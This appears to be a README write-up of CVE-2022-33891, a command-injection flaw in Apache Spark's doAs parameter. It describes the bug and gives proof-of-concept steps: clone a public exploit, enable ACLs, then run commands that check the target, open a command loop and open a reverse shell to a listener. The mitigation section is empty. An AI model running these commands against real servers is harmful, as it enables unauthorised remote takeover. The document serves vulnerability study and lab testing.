# CVE-2022-33891
## Apache Spark Shell-Command Injection Vulnerability

<hr/>

### Apache Spark
<p>Apache Spark is a multi-language engine for executing data engineering, data science and machine learning on single-node machines or clusters.<br/>
A framework that can quickly perform processing tasts on large data sets and can distribute processing tasks across multiple computers using distributed computing tools.
</p>
<p>Includes following features:
<ul>
    <li>Batch/streaming data</li>
    <li>SQL analytics</li>
    <li>Data science at scale</li>
    <li>Machine Learning</li>
</ul>
</p>

<hr/>

### Vulnerability
<ul>

<li><b> Arbitrary Shell Command Execution </b></li>
<li><b> Base Score: 8.8 HIGH </b></li>


<li><b>Description:</b>
<p>
<ul>

<li>Access Control lists(ACLs) can be enabled in the Apache Spark via the configuration option <i><b> spark.acls.enable </i></b></li>

<li>An authentication filter checks wheter a user has access permissions to view and modify the application</li>

<li>If ACLs are enables, a code path in HttpSecurityFilter can allow someone to perform impersonation by providing an arbitrary user name.</li>

<li>A malicious user might then be able to reach a permission check function that will ultimately build a Unix shell command based on the input and then execute it.</li>

</ul>
</p>
</li>
</ul>

<hr/>

### Working
 
<ul>
<li>Vulnerable Component: <code> http://localhost:8080/?doAs=`[command injection]`</code></li>

<li>The commands entered by user are processed through the <i><b>?doAs</i></b> parameter.</li>

<li>No reflection is visible after executing command indicates that this is blind OS injection.</li>

<li>As commands are entered in the URL paramter, <i><b>?doAs</i></b> will trigger background linux bash process to run the process.</li>
</ul>

<hr/>

### Steps to Exploit (POC)

<ol>
    <li>Setting testing environment<br/>
        <ul>
            <li>Install Apache Spark: 
            <i><a href="https://sparkbyexamples.com/spark/spark-installation-on-linux-ubuntu/">Installation</a></i>
            </li>
            <li>
            Install vulnerable version from archives:
            <i><a href="https://archive.apache.org/dist/spark/">Archive</a></i>
            </li>
            <li>You can also use the docker provided along with the exploit.</li>
        </ul>
    </li>
    <li>
    Exploit Installation<br/>
        <ul>
            <li>Download the exploit:<a href="https://github.com/HuskyHacks/cve-2022-33891">Exploit</a></li>
            <li><code>git clone https://github.com/HuskyHacks/cve-2022-33891.git</code>
            </li>
        </ul>
    </li>
    <li>
    Run the exploit:
        <ul>
<li>Before running the exploit make sure to enable acls. In the container bash sessions enter:<br/>
<code>echo "spark.acls.enable true" >> conf/spark-defaults.conf</code></li>
<li>Vulnerability check:<br/>
<code>python3 poc.py -u <url> -p 8080 --check --verbose</code><br/>

![spark-shell-poc1](https://user-images.githubusercontent.com/88927842/197633203-7863c838-770c-44b1-a3a2-a805bd7ea1ba.png)
</li>
<li>Command prompt loop:<br/>
<code>python3 poc.py -u <url> -p 8080  --verbose</code><br/>

![spark-shell-poc2](https://user-images.githubusercontent.com/88927842/197633280-80ca037a-e736-44ae-a769-963fc3cddfc0.png)
</li>

<li>Reverse shell:<br/>
<code>python3 poc.py -u <url> -p 8080 --revshell -lh <ip-address> -lp 9001 --verbose</code><br/>

![spark-shell-poc3](https://user-images.githubusercontent.com/88927842/197633307-7605b269-492a-470f-a9e6-71327400291f.png)
</li>
        </ul>
    </li>

</ol>

<hr/>

### Impact

<p>Attacker can establish a reverse shell, where there is a high chance of the adversary getting access to apache spark server.</p>

<hr/>

### Affected versions
### Mitigation